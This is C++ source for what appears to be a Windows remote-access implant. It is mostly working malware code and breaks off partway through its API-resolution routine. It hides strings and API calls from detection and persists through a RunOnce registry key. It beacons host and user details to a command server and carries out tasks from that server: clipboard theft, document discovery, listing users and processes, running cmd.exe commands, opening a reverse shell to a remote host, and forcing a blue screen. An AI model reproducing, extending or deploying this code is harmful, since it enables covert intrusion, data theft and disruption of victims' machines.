#include "general.h"
#include "Resolve.h"

typedef struct _PERSISTENCE_INFORMATION {
	LPCSTR regRunOnce = AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
	LPCSTR regSubKey = AY_OBFUSCATE("NtManagementUpdate");
	LPCSTR filePathDisk = AY_OBFUSCATE("C:\\Users\\Public\\NtManagementUpdate.exe");
};

typedef struct CONFIGURATION {
	struct _PERSISTENCE_INFORMATION persistence_information;
};

_PERSISTENCE_INFORMATION persistenceData;

BOOL taskingEngine(char* recvBuffer);

std::string generateKey()
{
	srand(time(NULL));
	std::string sessionId;
	static const char characters[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for (int i = 0; i < 20; i++) {
		sessionId += characters[rand() % (sizeof(characters) - 1)];
	}

	sessionId.insert(10, "-");

	return sessionId;
}

char* currentUser()
{
	char usernameBuffer[32 + 1];
	DWORD usernameBufferSize = 32 + 1;
	hash_GetUserNameA(usernameBuffer, &usernameBufferSize);

	return usernameBuffer;
}

const char* currentArch()
{
	const char* archValue = 0;
	SYSTEM_INFO lpSystemInfo;
	hash_GetSystemInfo(&lpSystemInfo);
	int cpuType = lpSystemInfo.wProcessorArchitecture;

	if (cpuType == 0) {
		archValue = AY_OBFUSCATE("x86");
	}
	else if (cpuType == 9) {
		archValue = AY_OBFUSCATE("x64");
	}

	return archValue;
}

char* computerName()
{
	char lpBuffer[32];
	DWORD nSize = sizeof(lpBuffer);
	hash_GetComputerNameA(lpBuffer, &nSize);

	return lpBuffer;
}

int currentPid()
{
	int currentPid = hash_GetCurrentProcessId();
	return currentPid;
}

BOOL checkAdministrator()
{
	HANDLE TokenHandle = NULL;
	BOOL isAdmin = { 0 };
	BOOL openToken = hash_OpenProcessToken(hash_GetCurrentProcess(), TOKEN_QUERY, &TokenHandle);
	if (openToken)
	{
		TOKEN_ELEVATION tokenElevation = { 0 };
		DWORD ReturnLength = sizeof(TOKEN_ELEVATION);
		BOOL checkToken = hash_GetTokenInformation(TokenHandle, TokenElevation, &tokenElevation, sizeof(tokenElevation), &ReturnLength);
		if (tokenElevation.TokenIsElevated)
		{
			isAdmin = TRUE;
		}
		else {
			isAdmin = FALSE;
		}
	}

	hash_CloseHandle(TokenHandle);

	return isAdmin;
}

void uninstall()
{
	hash_DeleteFileA(persistenceData.filePathDisk);

	HKEY phkResult = { 0 };
	LSTATUS reg_open = hash_RegOpenKeyExA(HKEY_CURRENT_USER, persistenceData.regRunOnce, 0, KEY_QUERY_VALUE | DELETE, &phkResult);
	if (reg_open == ERROR_SUCCESS)
	{
		hash_RegDeleteKeyValueA(HKEY_CURRENT_USER, persistenceData.regRunOnce, persistenceData.regSubKey);
	}

	hash_RegCloseKey(phkResult);

	// uses Jonas's method for self-deletion
	Uninstall::SelfDelete();

	hash_ExitProcess(1);
}

void maintainPersistence()
{
	char lpFilename[MAX_PATH];
	DWORD current_path = hash_GetModuleFileNameA(NULL, lpFilename, sizeof(lpFilename));
	if (current_path)
	{
		BOOL stats = 0;
		hash_CopyFileA(lpFilename, persistenceData.filePathDisk, stats);
	}

	HKEY phkResult = { 0 };
	LPCSTR runOnceKey = persistenceData.regRunOnce;

	LSTATUS openKey = hash_RegOpenKeyExA(HKEY_CURRENT_USER, runOnceKey, 0, KEY_WRITE, &phkResult);

	if (openKey == ERROR_SUCCESS)
	{
		LPCSTR lpValueName = persistenceData.regSubKey;
		const BYTE* lpData = (LPBYTE)persistenceData.filePathDisk;
		DWORD cbData = strlen(persistenceData.filePathDisk);

		hash_RegSetValueExA(phkResult, lpValueName, 0, KEY_WRITE, lpData, cbData);
	}

	hash_RegCloseKey(phkResult);
}

std::string gatherDocuments(char* directory)
{
	static const WCHAR* file_extensions[] = { L"*.pptx", L"*.docx", L"*.rtf", L"*.pdf", L"*.xlsx", L"*.one" };
	WIN32_FIND_DATA lpFindFileData;
	HANDLE hFile = hash_FindFirstFileW(Conversion::charArrayToLPCWSTR(directory), &lpFindFileData);
	wchar_t files[1024];

	std::vector<std::string>stringFiles;

	if (hFile != INVALID_HANDLE_VALUE)
	{
		do {
			// changed hardcoded array size to use sizeof
			for (int i = 0; i < sizeof(file_extensions) / sizeof(file_extensions[0]); i++)
			{
				if ((lpFindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0
					&& hash_PathMatchSpecW(lpFindFileData.cFileName, file_extensions[i]))
				{
					swprintf(files, 1024, L"%s\n", lpFindFileData.cFileName);

					std::string stringValue = Conversion::wcharToString(files);
					stringFiles.push_back(stringValue);
				}
			}
		} while (hash_FindNextFileW(hFile, &lpFindFileData));
	}

	hash_FindClose(hFile);

	std::string result = Conversion::vectorToString(stringFiles);

	return result;
}

std::string getProcesses()
{
	wchar_t processName[1024];
	char* bufferData3[1024] = { 0 };

	std::vector<std::string>process_list;

	// updated this to not be a uninitlized struct
	PSYSTEM_PROCESS_INFO ProcessInformation = { 0 };
	PVOID buffer = { 0 };
	ProcessInformation = (PSYSTEM_PROCESS_INFO)buffer;
	ProcessInformation = (PSYSTEM_PROCESS_INFO)hash_VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(hash_NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, 1024 * 1024, NULL)))
	{
		hash_VirtualFree(ProcessInformation, 0, MEM_RELEASE);
	}

	LPCSTR processInformation = AY_OBFUSCATE("[PID %i] %s\n");

	while (ProcessInformation->NextEntryOffset)
	{
		swprintf(processName, 1024, Conversion::charToWChar(processInformation),
			ProcessInformation->ProcessId,
			ProcessInformation->ImageName.Buffer);

		std::string stringValue = Conversion::wcharToString(processName);
		process_list.push_back(stringValue);

		ProcessInformation = (PSYSTEM_PROCESS_INFO)((LPBYTE)ProcessInformation + ProcessInformation->NextEntryOffset);
	}

	std::string result = Conversion::vectorToString(process_list);

	return result;
}

std::string getDrivers()
{
	char bufferData[1024];
	std::vector<std::string>drivers_list;

	PRTL_PROCESS_MODULES SystemInformation;
	SystemInformation = (PRTL_PROCESS_MODULES)hash_VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(hash_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, SystemInformation, 1024 * 1024, NULL)))
	{
		hash_VirtualFree(SystemInformation, 0, MEM_RELEASE);
	}

	for (ULONG i = 0; i < SystemInformation->NumberOfModules; i++)
	{
		sprintf_s(bufferData, AY_OBFUSCATE("0x%p  | %s\n"), SystemInformation->Modules[i].ImageBase, SystemInformation->Modules[i].FullPathName);
		drivers_list.push_back(bufferData);
	}

	std::string result = Conversion::vectorToString(drivers_list);

	return result;
}

std::string getClipBoardData()
{
	std::string data;
	HANDLE hClipdata;
	char string[512];
	if (hash_OpenClipboard(0))
	{
		if ((hClipdata = hash_GetClipboardData(CF_TEXT)) != NULL)
		{
			sprintf_s(string, sizeof(string), AY_OBFUSCATE("%s"), (char*)hClipdata);
			hash_CloseClipboard();
		}
	}
	else {
		hash_CloseClipboard();
	}

	data.append(string);
	return data;
}

std::string getUserInformation()
{
	LPUSER_INFO_0 pBuf = NULL;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD dwTotalCount = 0;

	NET_API_STATUS nStatus;

	DWORD i;

	wchar_t userInformation[2048];
	std::vector<std::string>stringuserInformation;
	LPCSTR informationBuffer = AY_OBFUSCATE("User account name: %s \nPassword age: %d \nLast logon: %d\nLast logoff: %d\nNumber of logons: %d\n----------------------\n");

	do
	{
		nStatus = NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf,
			MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);

		for (i = 0; (i < dwEntriesRead); i++)
		{
			LPUSER_INFO_2 userInfo = NULL;

			nStatus = NetUserGetInfo(NULL, pBuf->usri0_name, 3, (LPBYTE*)&userInfo);
			if (nStatus == NERR_Success)
			{
				swprintf(userInformation, sizeof(userInformation),
					Conversion::charToWChar(informationBuffer),
					userInfo->usri2_name,
					userInfo->usri2_password_age,
					userInfo->usri2_last_logon,
					userInfo->usri2_last_logoff,
					userInfo->usri2_num_logons
				);

				std::string stringValue = Conversion::wcharToString(userInformation);
				stringuserInformation.push_back(stringValue);
			}

			NetApiBufferFree(userInfo);

			pBuf++;
			dwTotalCount++;
		}
		NetApiBufferFree(pBuf);
	}

	while (nStatus == ERROR_MORE_DATA);

	std::string result = Conversion::vectorToString(stringuserInformation);

	return result;
}

std::string killProcessByPid(int pid)
{
	HANDLE hProcess = hash_OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (hProcess != NULL)
	{
		if (hash_TerminateProcess(hProcess, 1))
		{
			return "status_success";
		}
		hash_CloseHandle(hProcess);
	}
}

std::string executeCommand(char* command)
{
	BOOL ok = TRUE;

	const char* resultChar = { 0 };

	STARTUPINFOA si = { 0 };
	si.cb = sizeof(STARTUPINFO);

	PROCESS_INFORMATION pi = { 0 };
	LPCSTR lpApplicationName = AY_OBFUSCATE("C:\\Windows\\System32\\cmd.exe");

	char cmdline[MAX_PATH + 50];
	sprintf_s(cmdline, AY_OBFUSCATE("/c %s"), command);

	BOOL exec = hash_CreateProcessA(lpApplicationName, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (exec != 0)
	{
		resultChar = AY_OBFUSCATE("[+] Executed command successfully");
	}
	std::string result = std::string(resultChar);

	hash_CloseHandle(pi.hThread);
	hash_CloseHandle(pi.hProcess);

	return result;
}

/*
std::string downloadFile(char* remoteFilePath)
{
	std::streampos fileSize;
	std::ifstream file(remoteFilePath, std::ios::binary);

	// get its size:
	file.seekg(0, std::ios::end);
	fileSize = file.tellg();
	file.seekg(0, std::ios::beg);

	// read the data:
	std::vector<BYTE> fileData(fileSize);
	file.read((char*)&fileData[0], fileSize);

	char* cFileStr = reinterpret_cast<char*>(&fileData[0]);

	std::string fileStringb64Data = base64_encode(reinterpret_cast<BYTE*>(cFileStr), strlen(cFileStr));

	return fileStringb64Data;
}

std::string uploadFile(char* fileFromServer)
{
	std::string recvBufferStr(fileFromServer);
	std::vector<BYTE>decodedResponse = base64_decode(recvBufferStr);
	std::string decodedResponseStr(decodedResponse.begin(), decodedResponse.end());

	HANDLE create_file = CreateFileA("test.txt",
		(GENERIC_READ | GENERIC_WRITE), 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (create_file)
	{
		DWORD lpNumberOfBytesWritten = 0;
		WriteFile(create_file, decodedResponseStr.c_str(), strlen(decodedResponseStr.c_str()), &lpNumberOfBytesWritten, NULL);
	}
	CloseHandle(create_file);
	/*
	std::ofstream file("test.txt");
	file << decodedResponseStr;

	file.close();

std::string filePath = "Successfully wrote file";
return filePath;
}
*/

std::string deleteTargetFile(char* filepath)
{
	hash_DeleteFileA(filepath);
	std::string result = "Successfully deleted file";
	return result;
}

void invokeBSOD()
{
	BOOLEAN enabled;
	if (hash_RtlAdjustPrivilege(19, TRUE, FALSE, &enabled) == 0)
	{
		ULONG response;
		hash_NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, 6, &response);
	}
}

void DropShell(SOCKET cSocket)
{
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	//HANDLE InRead, OutRead, InWrite, OutWrite;

	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = (HANDLE)cSocket;
	si.hStdOutput = (HANDLE)cSocket;
	si.hStdError = (HANDLE)cSocket;

	//char cmdPath[] = "C:\\Windows\\System32\\cmd.exe";
	hash_CreateProcessA(NULL, AY_OBFUSCATE("C:\\Windows\\System32\\cmd.exe"), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	hash_WaitForSingleObject(pi.hProcess, INFINITE);

	hash_CloseHandle(pi.hProcess);
	hash_CloseHandle(pi.hThread);
}

// reverse shell contains unencrypted traffic
void reverseShell(const char* shellConfigurationData)
{
	WSADATA WSAData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	int winsockInit = hash_WSAStartup(MAKEWORD(2, 2), &WSAData);

	if (winsockInit == 0)
	{
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		std::vector<std::string> decrypted_config_vec = Encrypt::parseConfiguration(std::string(shellConfigurationData));

		PCSTR REMOTE_SERVER = decrypted_config_vec[0].c_str();
		PCSTR REMOTE_PORT = decrypted_config_vec[1].c_str();

		int addrInfo = hash_getaddrinfo(REMOTE_SERVER, REMOTE_PORT, &hints, &result);

		if (addrInfo == 0)
		{
			ptr = result;
			SOCKET cSocket = INVALID_SOCKET;
			cSocket = hash_WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);

			hash_connect(cSocket, ptr->ai_addr, (int)ptr->ai_addrlen);

			char recvBuffer[1024] = { 0 };

			hash_recv(cSocket, recvBuffer, sizeof(recvBuffer), 0);

			DropShell(cSocket);

			hash_closesocket(cSocket);
			hash_WSACleanup();
		}
	}
}

// both the beaconing and exfil should be AES encrypted with a protected key but padding is an issue
std::string beaconingRequestData()
{
	char* username = currentUser();
	const char* arch = currentArch();
	char* computer = computerName();
	int pid = currentPid();
	const char* id = generateKey().c_str();
	BOOL isAdmin = checkAdministrator();
	cJSON* dataRequest = cJSON_CreateObject();

	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("type"), AY_OBFUSCATE("task_checkin"));
	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("id"), id);
	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("user"), username);
	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("architecture"), arch);
	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("hostname"), computer);
	cJSON_AddNumberToObject(dataRequest, AY_OBFUSCATE("pid"), pid);
	cJSON_AddBoolToObject(dataRequest, AY_OBFUSCATE("isAdmin"), isAdmin);

	std::string b64Data = Conversion::base64Encode(dataRequest);

	// AES encryption here - warning, uses a hardcoded key
	//std::vector<unsigned char> encrypted_traffic = Encrypt::encryptNetworkTraffic(b64Data);
	//std::string encrypted_data_string = { encrypted_traffic.begin(), encrypted_traffic.end() };

	return b64Data;
}

std::string buildExfilBuffer(std::string buffer)
{
	cJSON* dataRequest = cJSON_CreateObject();
	const char* exfilData = buffer.c_str();

	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("type"), AY_OBFUSCATE("task_result"));
	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("success"), AY_OBFUSCATE("true"));
	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("task_result"), exfilData);

	std::string b64Data = Conversion::base64Encode(dataRequest);

	// AES encryption here - warning, uses a hardcoded key
	//std::vector<unsigned char> encrypted_traffic = Encrypt::encryptNetworkTraffic(b64Data);
	//std::string encrypted_data_string = { encrypted_traffic.begin(), encrypted_traffic.end() };

	return b64Data;
}

char* parseResponse(char* recvBuffer, int fieldCheck) {
	std::string recvBufferStr(recvBuffer);
	std::vector<BYTE>decodedResponse = base64_decode(recvBufferStr);
	std::string decodedResponseStr(decodedResponse.begin(), decodedResponse.end());

	char* charJsonDataDecoded = const_cast<char*>(decodedResponseStr.c_str());

	cJSON* root = cJSON_Parse(charJsonDataDecoded);
	char* task_command;
	char* task_data;

	switch (fieldCheck)
	{
	case 1:
		// get task_command (xor encrypted)
		task_command = cJSON_GetObjectItem(root, AY_OBFUSCATE("task_command"))->valuestring;
		//std::cout << "Command: " << task_command << std::endl;
		return task_command;
	case 2:
		//get task_data (xor encrypted)
		task_data = cJSON_GetObjectItem(root, AY_OBFUSCATE("task_data"))->valuestring;
		//std::cout << "Data: " << task_data << std::endl;
		return task_data;
	}

	cJSON_Delete(root);
}

BOOL sendNetworkRequest(std::string buffer, BOOL requestType)
{
	BOOL status = FALSE;
	LPCSTR userAgent = AY_OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36");
	HINTERNET hOpen;

	// decrypt the embedded configuration
	std::vector<std::string> decrypted_config_vec = Encrypt::returnConfigValues();
	LPCSTR remoteUrl = decrypted_config_vec[0].c_str();
	int serverPort = atoi(decrypted_config_vec[1].c_str());

	HINTERNET hInternet = hash_InternetOpenA(userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect = hash_InternetConnectA(hInternet, remoteUrl, static_cast<INTERNET_PORT>(serverPort), NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

	if (requestType == TRUE) {
		hOpen = hash_HttpOpenRequestA(hConnect, AY_OBFUSCATE("POST"), AY_OBFUSCATE("/finish"), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
	}
	else {
		hOpen = hash_HttpOpenRequestA(hConnect, AY_OBFUSCATE("POST"), AY_OBFUSCATE("/update"), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
	}

	DWORD dwFlags;
	DWORD dwBuffLen = sizeof(dwFlags);

	// adds TLS via self-signed certs
	if (hash_InternetQueryOptionA(hOpen, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen)) {
		dwFlags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
		hash_InternetSetOptionA(hOpen, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}

	// add a layer of AES encryption here
	// requirements:
	//	1. generate a random AES key for each beacon request
	//	2. protect the key using a hardcoded RSA public key
	//  3. return the aes encrypted buffer and pass it to httpsendrequesta
	//  4. append the encrypted AES key to the end of each beacon request

	// processed encrypted data to exfil via beacon
	LPVOID finalBuffer = (LPVOID)buffer.c_str();

	BOOL hSend = hash_HttpSendRequestA(hOpen, NULL, 0, finalBuffer, strlen(buffer.c_str()));
	if (hSend != NULL) {
		status = TRUE;
	}

	CHAR recvBuffer[8084] = { 0 };
	DWORD lpdwNumberOfBytesRead = 0;

	// obtain a recv buffer for processing via the tasking engine
	if (hash_InternetReadFile(hOpen, recvBuffer, sizeof(recvBuffer) - 1, &lpdwNumberOfBytesRead)) {
		status = TRUE;
	}

	if (requestType == FALSE)
	{
		taskingEngine(recvBuffer);
	}

	hash_InternetCloseHandle(hInternet);
	hash_InternetCloseHandle(hConnect);
	hash_InternetCloseHandle(hOpen);

	return status;
}

BOOL taskingEngine(char* recvBuffer) {
	// parse the recvBuffer - It needs to be JSON + base64, so decode it and parse the json
	char* parseRecvBufferCommand = parseResponse(recvBuffer, 1);

	std::string dataToProcess;

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("empty_response")) == 0)
	{
		return 0;
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("get_processes")) == 0)
	{
		dataToProcess = getProcesses();
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("get_drivers")) == 0)
	{
		dataToProcess = getDrivers();
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("get_clipboard")) == 0)
	{
		dataToProcess = getClipBoardData();
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("find_files")) == 0)
	{
		char* parseRecvBufferData = parseResponse(recvBuffer, 2);
		dataToProcess = gatherDocuments(parseRecvBufferData);
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("get_users")) == 0)
	{
		dataToProcess = getUserInformation();
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("reg_persist")) == 0)
	{
		maintainPersistence();
		dataToProcess = AY_OBFUSCATE("[+] Success");
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("uninstall")) == 0)
	{
		uninstall();
		dataToProcess = AY_OBFUSCATE("[+] Success");
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("kill_pid")) == 0)
	{
		char* parseRecvBufferData = parseResponse(recvBuffer, 2);
		int pid = atoi(parseRecvBufferData);
		dataToProcess = killProcessByPid(pid);
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("exec_command")) == 0)
	{
		char* parseRecvBufferData = parseResponse(recvBuffer, 2);
		dataToProcess = executeCommand(parseRecvBufferData);
	}

	/*
	 these two tasks are not working at the moment, removed for now

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("download_file")) == 0)
	{
		char* parseRecvBufferData = parseResponse(recvBuffer, 2);
		dataToProcess = downloadFile(parseRecvBufferData);
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("upload_file")) == 0)
	{
		char* parseRecvBufferData = parseResponse(recvBuffer, 2);
		dataToProcess = uploadFile(parseRecvBufferData);
	}
	*/

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("delete_file")) == 0)
	{
		// this is pretty broken
		char* parseRecvBufferData = parseResponse(recvBuffer, 2);
		dataToProcess = deleteTargetFile(parseRecvBufferData);
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("rev_shell")) == 0)
	{
		char* parseRecvBufferData = parseResponse(recvBuffer, 2);
		if (hash_CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(reverseShell), parseRecvBufferData, 0, 0))
		{
			dataToProcess = AY_OBFUSCATE("[+] Success");
		}
	}

	if (strcmp(parseRecvBufferCommand, AY_OBFUSCATE("bsod")) == 0)
	{
		invokeBSOD();
	}

	// everything needs to eventually be converted to a std::string for processing
	std::string b64Data = buildExfilBuffer(dataToProcess);
	sendNetworkRequest(b64Data, TRUE);
}

void ApiHashLookup()
{
	const char* wininetDll = AY_OBFUSCATE("wininet.dll");
	const char* ntdllDll = AY_OBFUSCATE("ntdll.dll");
	const char* advapiDll = AY_OBFUSCATE("advapi32.dll");
	const char* kernel32Dll = AY_OBFUSCATE("Kernel32.dll");
	const char* shlwapiDll = AY_OBFUSCATE("Shlwapi.dll");
	const char* user32Dll = AY_OBFUSCATE("User32.dll");
	const char* netapi32Dll = AY_OBFUSCATE("netapi32.dll");
	const char* ws2_32Dll = AY_OBFUSCATE("ws2_32.dll");

	RESOLVE_TABLE rtExampleTbl = {
		{
			{0xB41BC329, wininetDll, NULL},		// InternetOpenA
			{0xD1216B5B, wininetDll, NULL},		// InternetConnectA
			{0x2D9533F5, wininetDll, NULL},		// HttpOpenRequestA
			{0xD95C758D, wininetDll, NULL},		// HttpSendRequestA
			{0xBB1B1683, wininetDll, NULL},		// InternetCloseHandle
			{0x4723F5CF, ntdllDll, NULL},		// NtQuerySystemInformation
			{0xCB91DCF7, advapiDll, NULL},		// RegSetValueExA
			{0x15041404, advapiDll, NULL},		// RegOpenKeyExA
			{0xAE0CF309, advapiDll, NULL},		// RegCloseKey
			{0xBC8907BD, advapiDll, NULL},		// RegDeleteKeyValueA
			{0x4CA09DE4, kernel32Dll, NULL},	// GetModuleFileNameA
			{0x41D40D85, kernel32Dll, NULL},	// DeleteFileA
			{0xF7A461D7, kernel32Dll, NULL},	// ExitProcess
			{0x91EEAB26, kernel32Dll, NULL},	// FindFirstFileW
			{0x6953D74,  shlwapiDll, NULL},		// PathMatchSpecW
			{0x379D857D, kernel32Dll, NULL},	// FindNextFileW
			{0x2FBFB496, kernel32Dll, NULL},	// FindClose
			{0x238A0878, user32Dll, NULL},		// OpenClipboard
			{0xA96BA6FC, user32Dll, NULL},		// GetClipboardData
			{0x978B46D0, user32Dll, NULL},		// CloseClipboard
			{0xF5C7CDFE, kernel32Dll, NULL},	// OpenProcess
			{0x46CC6235, kernel32Dll, NULL},	// TerminateProcess
			{0x3C11901F, kernel32Dll, NULL},	// CloseHandle
			{0xA154FCF0, kernel32Dll, NULL},	// VirtualAlloc
			{0x82F5A700, kernel32Dll, NULL},	// VirtualFree
			{0x68E9B1B9, kernel32Dll, NULL},	// CopyFileA
			{0x1DFA6109, wininetDll, NULL},		// InternetQueryOptionA
			{0xA5175C6B, wininetDll, NULL},		// InternetSetOptionA
			{0xA455EA09, wininetDll, NULL},		// InternetReadFile
			{0x9E687C1D, kernel32Dll, NULL},	// CreateProcessA
			{0x20EE48D4, ntdllDll, NULL},		// RtlAdjustPrivilege
			{0x404ACB20, ntdllDll, NULL},		// NtRaiseHardError
			{0x969C7342, ws2_32Dll, NULL},		// WSAStartup
			{0xB3649202, ws2_32Dll, NULL},		// getaddrinfo
			{0x4FB7476A, ws2_32Dll, NULL},		// connect
			{0xF32ACEAD, ws2_32Dll, NULL},		// recv
			{0x257CEBA6, ws2_32Dll, NULL},		// closesocket
			{0x385EA022, ws2_32Dll, NULL},		// WSACleanup
			{0xB49D06DA, kernel32Dll, NULL},	// WaitForSingleObject
			{0x735B67BB, ws2_32Dll, NULL},		// WSASocketW
			{0x8BA5EF66, kernel32Dll, NULL},	// CreateThread
			{0x59325EFC, advapiDll, NULL},		// GetUserNameA
			{0x8831BC8D, kernel32Dll, NULL},	// GetSystemInfo
			{0x66C46EA8, kernel32Dll, NULL},	// GetComputerNameA
			{0x9E6C4C,   kernel32Dll, NULL},	// GetCurrentProcessId
			{0x2CC55A0,  advapiDll, NULL},		// OpenProcessToken
			{0x7DEB3C2B, kernel32Dll, NULL},	// GetCurrentProcess
			{0xBED283,	 advapiDll, NULL}		// GetTokenInformation
		}
	};

	// resolve the entire table, set the value to the amount of hashes expected to resolve
	if (resolve_init(&rtExampleTbl, 48))
	{
		// entries for rtExampleTbl start at [0] (don't confuse with uCount)
		hash_InternetOpenA = (_InternetOpenA)rtExampleTbl.reEntries[0].lpAddr;
		hash_InternetConnectA = (_InternetConnectA)rtExampleTbl.reEntries[1].lpAddr;
		hash_HttpOpenRequestA = (_HttpOpenRequestA)rtExampleTbl.reEntries[2].lpAddr;
		hash_HttpSendRequestA = (_HttpSendRequestA)rtExampleTbl.reEntries[3].lpAddr;
		hash_InternetCloseHandle = (_InternetCloseHandle)rtExampleTbl.reEntries[4].lpAddr;
		hash_NtQuerySystemInformation = (_NtQuerySystemInformation)rtExampleTbl.reEntries[5].lpAddr;
		hash_RegSetValueExA = (_RegSetValueExA)rtExampleTbl.reEntries[6].lpAddr;
		hash_RegOpenKeyExA = (_RegOpenKeyExA)rtExampleTbl.reEntries[7].lpAddr;
		hash_RegCloseKey = (_RegCloseKey)rtExampleTbl.reEntries[8].lpAddr;
		hash_RegDeleteKeyValueA = (_RegDeleteKeyValueA)rtExampleTbl.reEntries[9].lpAddr;
		hash_GetModuleFileNameA = (_GetModuleFileNameA)rtExampleTbl.reEntries[10].lpAddr;
		hash_DeleteFileA = (_DeleteFileA)rtExampleTbl.reEntries[11].lpAddr;
		hash_ExitProcess = (_ExitProcess)rtExampleTbl.reEntries[12].lpAddr;
		hash_FindFirstFileW = (_FindFirstFileW)rtExampleTbl.reEntries[13].lpAddr;
		hash_PathMatchSpecW = (_PathMatchSpecW)rtExampleTbl.reEntries[14].lpAddr;
		hash_FindNextFileW = (_FindNextFileW)rtExampleTbl.reEntries[15].lpAddr;
		hash_FindClose = (_FindClose)rtExampleTbl.reEntries[16].lpAddr;
		hash_OpenClipboard = (_OpenClipboard)rtExampleTbl.reEntries[17].lpAddr;
		hash_GetClipboardData = (_GetClipboardData)rtExampleTbl.reEntries[18].lpAddr;
		hash_CloseClipboard = (_CloseClipboard)rtExampleTbl.reEntries[19].lpAddr;
		hash_OpenProcess = (_OpenProcess)rtExampleTbl.reEntries[20].lpAddr;
		hash_TerminateProcess = (_TerminateProcess)rtExampleTbl.reEntries[21].lpAddr;
		hash_CloseHandle = (_CloseHandle)rtExampleTbl.reEntries[22].lpAddr;
		hash_VirtualAlloc = (_VirtualAlloc)rtExampleTbl.reEntries[23].lpAddr;
		hash_VirtualFree = (_VirtualFree)rtExampleTbl.reEntries[24].lpAddr;
		hash_CopyFileA = (_CopyFileA)rtExampleTbl.reEntries[25].lpAddr;
		hash_InternetQueryOptionA = (_InternetQueryOptionA)rtExampleTbl.reEntries[26].lpAddr;
		hash_InternetSetOptionA = (_InternetSetOptionA)rtExampleTbl.reEntries[27].lpAddr;
		hash_InternetReadFile = (_InternetReadFile)rtExampleTbl.reEntries[28].lpAddr;
		hash_CreateProcessA = (_CreateProcessA)rtExampleTbl.reEntries[29].lpAddr;
		hash_RtlAdjustPrivilege = (_RtlAdjustPrivilege)rtExampleTbl.reEntries[30].lpAddr;
		hash_NtRaiseHardError = (_NtRaiseHardError)rtExampleTbl.reEntries[31].lpAddr;
		hash_WSAStartup = (_WSAStartup)rtExampleTbl.reEntries[32].lpAddr;
		hash_getaddrinfo = (_getaddrinfo)rtExampleTbl.reEntries[33].lpAddr;
		hash_connect = (_connect)rtExampleTbl.reEntries[34].lpAddr;
		hash_recv = (_recv)rtExampleTbl.reEntries[35].lpAddr;
		hash_closesocket = (_closesocket)rtExampleTbl.reEntries[36].lpAddr;
		hash_WSACleanup = (_WSACleanup)rtExampleTbl.reEntries[37].lpAddr;
		hash_WaitForSingleObject = (_WaitForSingleObject)rtExampleTbl.reEntries[38].lpAddr;
		hash_WSASocketW = (_WSASocketW)rtExampleTbl.reEntries[39].lpAddr;
		hash_CreateThread = (_CreateThread)rtExampleTbl.reEntries[40].lpAddr;
		hash_GetUserNameA = (_GetUserNameA)rtExampleTbl.reEntries[41].lpAddr;
		hash_GetSystemInfo = (_GetSystemInfo)rtExampleTbl.reEntries[42].lpAddr;
		hash_GetComputerNameA = (_GetComputerNameA)rtExampleTbl.reEntries[43].lpAddr;
